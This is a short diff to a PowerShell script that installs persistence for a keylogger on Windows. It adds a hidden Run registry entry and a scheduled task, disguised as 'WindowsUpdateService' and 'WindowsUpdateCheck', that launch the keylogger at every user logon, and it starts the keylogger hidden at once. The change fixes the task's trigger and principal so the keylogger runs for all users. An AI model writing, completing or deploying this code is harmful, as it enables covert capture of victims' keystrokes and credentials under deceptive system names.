@@ -49,13 +49,14 @@ $startupScript | Out-File -FilePath $startupScriptPath -Encoding UTF8
 $runOncePath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $runOncePath -Name "WindowsUpdateService" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $startupScriptPath"
 
-# Also create a scheduled task that runs at ANY user logon (not just SYSTEM)
+# Also create a scheduled task that runs at ANY user logon
 $action = New-ScheduledTaskAction -Execute $pyw -Argument $keyloggerPath
-$trigger = New-ScheduledTaskTrigger -AtLogOn -User "BUILTIN\Users"
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users"
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
 
 # Register task to run as the logged-in user (not SYSTEM)
-Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Settings $settings -Force
+Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
 
 # Start it now in current user context
 Start-Process $pyw -ArgumentList $keyloggerPath -WindowStyle Hidden
